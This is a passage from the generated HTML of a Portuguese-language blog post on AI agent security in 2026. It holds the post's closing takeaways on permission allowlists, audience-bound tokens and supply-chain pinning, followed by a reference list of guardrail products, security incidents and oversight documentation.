+<li><strong>93% de aprovação significa que a tua caixa de diálogo é telemetria, não segurança.</strong> Faz allowlist das ações rotineiras, escala apenas exceções, pára o loop quando há um cluster de negações. O princípio de desenho é só escalonamento.</li>
+<li><strong>Tokens vinculados à audiência e cofres por sessão são os factos criptográficos aborrecidos que fecham grandes buracos de política.</strong> RFC 8707 Resource Indicators e o padrão de cofre Claude Managed Agents são as implementações de referência de 2026.</li>
+<li><strong>Supply chain é uma preocupação do harness.</strong> Os agentes executam <code>npm install</code> mais depressa do que a tua incident response. Fixa versões, fixa SHAs, faz scan em CI, revê diffs de PRs conduzidos por agentes.</li>
+<li><strong>Constrói a camada de política para que o lançamento de um novo produto não a invalide.</strong> OpenAI Agents SDK, Codex CLI e Claude Code expressam os mesmos primitivos de forma diferente. Os primitivos (escadas de permissões, hooks, sandboxes, interrupts, tokens vinculados à audiência) são aquilo em que estás realmente a apostar.</li>
+</ol>
+<hr />
+<h2 id="referencias">Referências</h2>
+<h3 id="os-enquadramentos">Os enquadramentos</h3>
+<ul>
+<li>Bharani Subramaniam e Martin Fowler, <em><a href="https://martinfowler.com/articles/gen-ai-patterns/">Emerging Patterns in Building GenAI Products</a></em>.</li>
+<li>Simon Willison, <em><a href="https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/">The lethal trifecta for AI agents</a></em>, 16 de junho de 2025.</li>
+<li>Joel Fokou, <em><a href="https://arxiv.org/abs/2604.12986">Parallax: A Principled Architecture for Safe Agentic AI</a></em>, arXiv 2604.12986, 14 de abril de 2026 (sem peer review).</li>
+<li>Alessandro Pignati, <em><a href="https://dev.to/alessandro_pignati/your-ai-agent-has-too-much-power-understanding-and-taming-excessive-agency-4kbc">Your AI Agent Has Too Much Power: Understanding and Taming Excessive Agency</a></em>, janeiro de 2026.</li>
+</ul>
+<h3 id="produtos-de-llm-guardrails">Produtos de LLM guardrails</h3>
+<ul>
+<li><a href="https://docs.nvidia.com/nemo/guardrails/">NVIDIA NeMo Guardrails</a></li>
+<li><a href="https://huggingface.co/meta-llama/Llama-Guard-4-12B">Meta Llama Guard 4</a></li>
+<li><a href="https://guardrailsai.com">Guardrails AI</a></li>
+<li><a href="https://www.lakera.ai/lakera-guard">Lakera Guard</a></li>
+<li><a href="https://aws.amazon.com/bedrock/pricing/">AWS Bedrock Guardrails</a></li>
+<li><a href="https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection">Azure Content Safety: Prompt Shields</a></li>
+<li><a href="https://github.com/openai/openai-guardrails-python">openai-guardrails-python</a></li>
+</ul>
+<h3 id="incidentes">Incidentes</h3>
+<ul>
+<li>Itay Ravia (anteriormente Aim Labs, agora Cato Networks), <em><a href="https://www.catonetworks.com/blog/breaking-down-echoleak/">Breaking down EchoLeak</a></em> (CVE-2025-32711).</li>
+<li>AWS, <em><a href="https://github.com/aws/aws-toolkit-vscode/security/advisories/GHSA-7g7f-ff96-5gcw">Amazon Q Developer VS Code v1.84.0 advisory</a></em> (CVE-2025-8217).</li>
+<li>Microsoft, <em><a href="https://cvefeed.io/vuln/detail/CVE-2026-32211">Azure MCP Server</a></em> (CVE-2026-32211).</li>
+<li>Check Point Research, <em><a href="https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/">RCE and API token exfiltration through Claude Code project files</a></em> (CVE-2025-59536).</li>
+<li>axios, <em><a href="https://github.com/axios/axios/issues/10636">v1.14.1 / v0.30.4 compromise post-mortem</a></em>.</li>
+<li>Aqua Security, <em><a href="https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23">Trivy Actions tag hijack</a></em> (GHSA-69fq-xp46-6x23).</li>
+</ul>
+<h3 id="superficies-de-politica">Superfícies de política</h3>
+<ul>
+<li><a href="https://openai.github.io/openai-agents-python/mcp/">OpenAI Agents SDK — MCP tools docs</a></li>
+<li><a href="https://developers.openai.com/codex/enterprise/managed-configuration">Codex CLI managed configuration</a></li>
+<li><a href="https://code.claude.com/docs/en/permission-modes">Claude Code permission modes</a></li>
+<li><a href="https://code.claude.com/docs/en/sandboxing">Claude Code sandboxing</a></li>
+<li><a href="https://www.anthropic.com/engineering/managed-agents">Claude Managed Agents</a></li>
+</ul>
+<h3 id="hitl">HITL</h3>
+<ul>
+<li><a href="https://docs.langchain.com/oss/python/langgraph/interrupts">LangGraph interrupts docs</a></li>
+<li><a href="https://www.humanlayer.dev/docs/quickstart-python">HumanLayer Python quickstart</a></li>
+<li>Anthropic, <em><a href="https://www.anthropic.com/research/measuring-agent-autonomy">Measuring AI agent autonomy in practice</a></em>, 18 de fevereiro de 2026.</li>
+<li>Anthropic, <em><a href="https://www.anthropic.com/engineering/claude-code-auto-mode">Claude Code auto mode</a></em>, 25 de março de 2026.</li>
+<li>Jackson Wells (Galileo), <em><a href="https://galileo.ai/blog/human-in-the-loop-agent-oversight">How to Build Human-in-the-Loop Oversight for Production AI Agents</a></em>, 21 de dezembro de 2025.</li>
+</ul>
+<h3 id="owasp">OWASP</h3>
+<ul>
+<li>OWASP Agentic Security Initiative, <em><a href="https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/">Top 10 for Agentic Applications, 2026</a></em>, 9 de dezembro de 2025.</li>
+</ul>
+<h3 id="serie">Série</h3>
+<ul>
+<li><a href="/blog/2026/01/31/the-cognitive-engine--choosing-the-right-reasoning-loop/">Parte 1: AI Agent Reasoning Loops in 2026</a> — ReAct, ReWOO e Plan-and-Execute.</li>
+<li><a href="/blog/2026/02/14/the-cortex--architecting-memory-for-ai-agents/">Parte 2: AI Agent Memory Architecture in 2026</a> — checkpoints, vector stores e document memory.</li>
+<li><a href="/blog/2026/03/24/the-hands--tool-ergonomics-and-the-agent-computer-interface/">Parte 3: AI Agent Tool Use in 2026</a> — MCP, CLI, Skills, execução de código e ACI.</li>
+<li><strong>Parte 4: Segurança de Agentes de IA em 2026</strong> (este artigo)</li>
+<li><a href="/blog/2026/05/26/the-runtime--running-agents-for-hours-not-seconds/">Parte 5: Long-Running AI Agent Runtime in 2026</a> — sessões, sandboxes, checkpoints, harnesses e formas de deployment.</li>
+</ul>
+<hr />
+<p><em>O código do Market Analyst Agent (o hook de deny PreToolUse, input canary, validador via Stop-hook e interrupt gate descritos acima) está no <a href="https://github.com/slavadubrov/market-analyst-agent">GitHub</a>.</em></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+  
+
+
+ 
+  </article>
+</div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://www.linkedin.com/in/slavadubrov" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://slavadubrov.substack.com/" target="_blank" rel="noopener" title="Substack" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22.539 8.242H1.46V5.406h21.08zM1.46 10.812V24L12 18.11 22.54 24V10.812zM22.54 0H1.46v2.836h21.08z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="https://github.com/slavadubrov" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+    <a href="/feed_rss_created.xml" target="_blank" rel="noopener" title="RSS" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20 5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27zm0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.sections", "navigation.expand", "navigation.path", "navigation.indexes", "navigation.toc", "navigation.toc.sticky", "navigation.toc.maxdepth", "navigation.toc.title", "navigation.toc.collapse", "navigation.toc.collapse_empty_groups", "navigation.toc.collapse_single_children", "content.code.copy"], "search": "../../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado para \u00e1rea de transfer\u00eancia", "clipboard.copy": "Copiar para \u00e1rea de transfer\u00eancia", "search.result.more.one": "Mais 1 nesta p\u00e1gina", "search.result.more.other": "Mais # nesta p\u00e1gina", "search.result.none": "Nenhum resultado encontrado", "search.result.one": "1 resultado encontrado", "search.result.other": "# resultados encontrados", "search.result.placeholder": "Digite para iniciar a busca", "search.result.term.missing": "Ausente", "select.version": "Selecione a vers\u00e3o"}, "version": null}</script>
+    
+    
+      <script src="../../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+      
+        <script src="../../../../../../javascripts/mermaid-init.js"></script>
+      
+        <script src="../../../../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
